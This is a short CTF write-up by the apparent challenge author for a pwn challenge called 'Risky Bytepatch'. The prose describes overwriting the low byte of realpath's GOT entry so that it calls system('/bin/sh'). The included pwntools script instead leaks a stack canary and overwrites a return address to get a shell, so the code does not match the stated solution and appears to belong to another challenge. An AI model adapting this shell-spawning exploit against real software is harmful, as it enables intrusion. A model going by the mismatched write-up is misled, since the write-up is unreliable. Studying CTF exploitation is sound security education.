---
title: "CTF Writeup for Risky Bytepatch - A challenge in IITB Trust Lab CTF Round 2 2023"
last_modified_at: 2023-10-27
classes: wide
categories:
  - writeups
  - 2k23
  - IITBCTF
tags:
  - Writeup
  - Trust Lab CTF
  - pwn
---

This challenge was created by me for Trust Lab CTF Round 2 held in October 2023

# Challenge Description

Can you get the flag by changing a byte of the path resolving service running on the server?

[Here]({{site.baseurl}}/assets/ctf/2023/IITBCTF/risky_bytepatch.zip) are the challenge files.

## Solution 

We see that the program takes input and calls realpath function on it.
We can patch one byte of the program.
The files also include Dockerfile. Thus, we can get the libc that is used by the program running on server.
We see that `system` and `realpath` are in same 0x100 aligned block.
Therefore, after one call to realpath, we can replace last byte of address in GOT entry of realpath.
Now using the realpath functionality, a call to `system("/bin/sh")` can be made.

Here is the solution script.

```python
from pwn import *
context.log_level = 'debug'

p = process('./vuln')

p.sendline(b'300')

p.recvuntil(b'Say Something:')
p.sendline(b'a'*280)
# sleep(1)

p.recvuntil(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n')
# print(str(p.recv()))
canary = b'\x00' + p.recv(7)

log.warn(str(canary))

ret_add = p64(0x40129b)
p.sendline(b'a'*(0xa8-0x40) + canary + b'a'*7 * 8 + ret_add)

p.interactive()
```